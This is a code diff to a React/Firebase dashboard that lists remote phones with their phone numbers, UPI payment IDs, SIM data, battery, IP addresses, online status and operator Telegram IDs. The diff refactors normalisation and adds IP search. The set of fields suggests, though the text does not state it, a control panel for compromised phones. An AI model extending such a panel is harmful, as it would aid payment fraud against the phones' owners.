@@ -2,26 +2,14 @@ import { useEffect, useState, useMemo } from 'react';
 import { db } from '@/lib/firebase';
 import { ref, onValue, set, remove } from 'firebase/database';
 import { Link } from 'wouter';
-import { Search, Smartphone, Battery, BatteryWarning, Wifi, Pin, PinOff, Activity, ChevronRight } from 'lucide-react';
+import { Search, Smartphone, Battery, BatteryWarning, Pin, PinOff, Activity, ChevronRight, Wifi } from 'lucide-react';
 import { Layout } from '@/components/layout';
 import { useAuth } from '@/lib/auth';
-
-interface Device {
-  id: string;
-  phone?: string;
-  upi?: string;
-  model?: string;
-  battery?: string;
-  status?: string;
-  ping?: string;
-  sim1?: string;
-  sim2?: string;
-  ownerTelegramId?: string;
-}
+import { normalizeDevice, type NormalizedDevice } from '@/lib/normalizeDevice';
 
 export function Dashboard() {
   const { isAdmin, userId } = useAuth();
-  const [devices, setDevices] = useState<Device[]>([]);
+  const [devices, setDevices] = useState<NormalizedDevice[]>([]);
   const [loading, setLoading] = useState(true);
   const [search, setSearch] = useState('');
   const [pinnedIds, setPinnedIds] = useState<Set<string>>(new Set());
@@ -31,10 +19,9 @@ export function Dashboard() {
     const unsubscribe = onValue(clientsRef, (snapshot) => {
       if (snapshot.exists()) {
         const data = snapshot.val();
-        const devicesList = Object.keys(data).map((key) => ({
-          id: key,
-          ...data[key],
-        }));
+        const devicesList = Object.keys(data).map((key) =>
+          normalizeDevice(key, data[key])
+        );
         setDevices(devicesList);
       } else {
         setDevices([]);
@@ -82,10 +69,11 @@ export function Dashboard() {
       ? visibleDevices.filter((d) => {
           const q = search.toLowerCase();
           return (
-            (d.phone && d.phone.toLowerCase().includes(q)) ||
-            (d.model && d.model.toLowerCase().includes(q)) ||
-            (d.upi && d.upi.toLowerCase().includes(q)) ||
-            d.id.toLowerCase().includes(q)
+            d.phone.toLowerCase().includes(q) ||
+            d.model.toLowerCase().includes(q) ||
+            d.upi.toLowerCase().includes(q) ||
+            d.id.toLowerCase().includes(q) ||
+            (d.ip_address || '').includes(q)
           );
         })
       : visibleDevices;
@@ -94,21 +82,13 @@ export function Dashboard() {
       const aPinned = pinnedIds.has(a.id) ? 0 : 1;
       const bPinned = pinnedIds.has(b.id) ? 0 : 1;
       if (aPinned !== bPinned) return aPinned - bPinned;
-      const aOnline = isOnline(a.ping) ? 0 : 1;
-      const bOnline = isOnline(b.ping) ? 0 : 1;
+      const aOnline = a.isOnline ? 0 : 1;
+      const bOnline = b.isOnline ? 0 : 1;
       return aOnline - bOnline;
     });
   }, [visibleDevices, search, pinnedIds]);
 
-  const isOnline = (pingTimestamp: string | undefined) => {
-    if (!pingTimestamp) return false;
-    const pingTime = parseInt(pingTimestamp, 10);
-    if (isNaN(pingTime)) return false;
-    return Date.now() - pingTime < 300_000;
-  };
-
-  const getBatteryValue = (battery: string | undefined) => {
-    if (!battery) return 0;
+  const getBatteryValue = (battery: string) => {
     return parseInt(battery.replace('%', ''), 10) || 0;
   };
 
@@ -122,6 +102,7 @@ export function Dashboard() {
             <span>
               {filteredDevices.length} device{filteredDevices.length !== 1 ? 's' : ''}
               {pinnedIds.size > 0 && ` · ${pinnedIds.size} pinned`}
+              {' · '}<span className="text-[#10b981]">{filteredDevices.filter(d => d.isOnline).length} online</span>
             </span>
           </p>
         </div>
@@ -130,7 +111,7 @@ export function Dashboard() {
           <Search className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-[#6b5b7d]" />
           <input
             type="text"
-            placeholder="Search by phone, SIM or model..."
+            placeholder="Search phone, model, IP..."
             value={search}
             onChange={(e) => setSearch(e.target.value)}
             className="w-full bg-white border border-[#d8c8f0] rounded-2xl py-2.5 pl-11 pr-4 text-sm text-[#2d1b4e] focus:outline-none focus:ring-2 focus:ring-[#7c3aed]/20 focus:border-[#7c3aed] transition-all placeholder:text-[#9ca3af]"
@@ -161,7 +142,6 @@ export function Dashboard() {
       ) : (
         <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-4 animate-in fade-in slide-in-from-bottom-4 duration-500 fill-mode-both">
           {filteredDevices.map((device, i) => {
-            const online = isOnline(device.ping);
             const batteryNum = getBatteryValue(device.battery);
             const isPinned = pinnedIds.has(device.id);
 
@@ -176,7 +156,7 @@ export function Dashboard() {
                 }`}
                 style={{ animationDelay: `${i * 50}ms` }}
               >
-                <div className={`absolute top-0 left-0 h-1 w-full transition-colors ${isPinned ? 'bg-[#7c3aed]' : 'bg-[#d8c8f0] group-hover:bg-[#b8a0e0]'}`} />
+                <div className={`absolute top-0 left-0 h-1 w-full transition-colors ${isPinned ? 'bg-[#7c3aed]' : device.isOnline ? 'bg-[#10b981]' : 'bg-[#d8c8f0] group-hover:bg-[#b8a0e0]'}`} />
 
                 <div className="flex justify-between items-start mb-4 mt-1">
                   <div className="flex items-center gap-3">
@@ -185,8 +165,8 @@ export function Dashboard() {
                     </div>
                     <div>
                       <div className="text-xs font-medium text-[#6b5b7d]">DEVICE {i.toString().padStart(3, '0')}</div>
-                      <div className="font-semibold text-sm text-[#2d1b4e] truncate w-28" title={device.model || 'Unknown Model'}>
-                        {device.model || 'Unknown Model'}
+                      <div className="font-semibold text-sm text-[#2d1b4e] truncate w-28" title={device.model}>
+                        {device.model}
                       </div>
                     </div>
                   </div>
@@ -205,12 +185,12 @@ export function Dashboard() {
                     </button>
 
                     <span className={`inline-flex items-center gap-1 px-2.5 py-1 rounded-full text-xs font-semibold ${
-                      online
+                      device.isOnline
                         ? 'bg-[#10b981]/10 text-[#10b981]'
                         : 'bg-[#9ca3af]/20 text-[#6b5b7d]'
                     }`}>
-                      <span className={`w-1.5 h-1.5 rounded-full ${online ? 'bg-[#10b981]' : 'bg-[#9ca3af]'}`} />
-                      {online ? 'Online' : 'Offline'}
+                      <span className={`w-1.5 h-1.5 rounded-full ${device.isOnline ? 'bg-[#10b981] animate-pulse' : 'bg-[#9ca3af]'}`} />
+                      {device.isOnline ? 'Online' : 'Offline'}
                     </span>
                   </div>
                 </div>
@@ -221,21 +201,43 @@ export function Dashboard() {
                     <span className="font-medium text-xs text-[#2d1b4e]">{device.phone || 'N/A'}</span>
                   </div>
                   <div className="flex flex-col">
-                    <span className="text-[10px] text-[#6b5b7d] uppercase tracking-wider font-medium">UPI ID</span>
-                    <span className="font-medium text-xs text-[#7c3aed]">{device.upi || 'N/A'}</span>
+                    {device.upi ? (
+                      <>
+                        <span className="text-[10px] text-[#6b5b7d] uppercase tracking-wider font-medium">UPI</span>
+                        <span className="font-medium text-xs text-[#7c3aed] truncate">{device.upi}</span>
+                      </>
+                    ) : device.androidV ? (
+                      <>
+                        <span className="text-[10px] text-[#6b5b7d] uppercase tracking-wider font-medium">Android</span>
+                        <span className="font-medium text-xs text-[#2d1b4e]">v{device.androidV}</span>
+                      </>
+                    ) : (
+                      <>
+                        <span className="text-[10px] text-[#6b5b7d] uppercase tracking-wider font-medium">UPI</span>
+                        <span className="font-medium text-xs text-[#9ca3af]">N/A</span>
+                      </>
+                    )}
                   </div>
                 </div>
 
                 <div className="mt-4 pt-3 border-t border-[#d8c8f0] flex items-center justify-between">
                   <div className="flex items-center gap-3">
-                    <div className="flex items-center gap-1 text-xs text-[#6b5b7d] font-medium">
-                      {batteryNum <= 20 ? (
-                        <BatteryWarning className="w-3.5 h-3.5 text-[#f59e0b]" />
-                      ) : (
-                        <Battery className="w-3.5 h-3.5" />
-                      )}
-                      <span className={batteryNum <= 20 ? 'text-[#f59e0b]' : ''}>{device.battery || '0%'}</span>
-                    </div>
+                    {device.battery && (
+                      <div className="flex items-center gap-1 text-xs text-[#6b5b7d] font-medium">
+                        {batteryNum <= 20 ? (
+                          <BatteryWarning className="w-3.5 h-3.5 text-[#f59e0b]" />
+                        ) : (
+                          <Battery className="w-3.5 h-3.5" />
+                        )}
+                        <span className={batteryNum <= 20 ? 'text-[#f59e0b]' : ''}>{device.battery}</span>
+                      </div>
+                    )}
+                    {device.ip_address && (
+                      <span className="text-[10px] font-medium text-[#6b5b7d] bg-[#f5efff] px-1.5 py-0.5 rounded-lg border border-[#d8c8f0] flex items-center gap-1">
+                        <Wifi className="w-2.5 h-2.5" />
+                        {device.ip_address.split('.').slice(0,2).join('.')}…
+                      </span>
+                    )}
                     {device.ownerTelegramId && isAdmin && (
                       <span className="text-[10px] font-medium text-[#6b5b7d] bg-[#f5efff] px-1.5 py-0.5 rounded-lg border border-[#d8c8f0]">
                         {device.ownerTelegramId.slice(0, 8)}…
